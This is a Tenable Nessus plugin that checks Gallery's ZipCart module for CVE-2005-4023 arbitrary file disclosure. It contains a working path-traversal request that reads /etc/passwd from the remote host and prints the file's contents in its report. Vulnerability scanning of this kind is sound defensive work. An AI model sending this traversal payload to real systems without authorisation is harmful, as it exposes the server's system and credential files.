#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(21018);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2005-4023");
  script_bugtraq_id(15614);
  script_xref(name:"OSVDB", value:"21312");

  script_name(english:"Gallery Zipcart Module Arbitrary File Disclosure");
  script_summary(english:"Tries to retrieve a file using Gallery's ZipCart module");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to an
information disclosure issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Gallery, a web-based photo album
application written in PHP. 

The installation of Gallery on the remote host allows an
unauthenticated remote attacker to use the ZipCart module to retrieve
arbitrary files, subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2005-11/0371.html" );
 script_set_attribute(attribute:"solution", value:
"Deactivate the ZipCart module." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/gallery", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  file = "../../../../../../../../../../../../etc/passwd";
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/main.php?",
      "g2_view=zipcart.Download&",
      "g2_file=", file
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = strcat(w[0], w[1], '\r_n', w[2]);

  # There's a problem if...
  if (
    # it looks like ZipCart and...
    'filename="G2cart.zip"' >< res &&
    # there's an entry for root.
    egrep(pattern:"root:.*:0:[01]:", string:res)
  ) {
    content = strstr(res, "Content-Type: application/zip");
    if (content) content = content - "Content-Type: application/zip";
    else content = res;

    report = string(
      "\n",
      "Here are the contents of the file '/etc/passwd' that\n",
      "Nessus was able to read from the remote host :\n",
      "\n",
      content
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
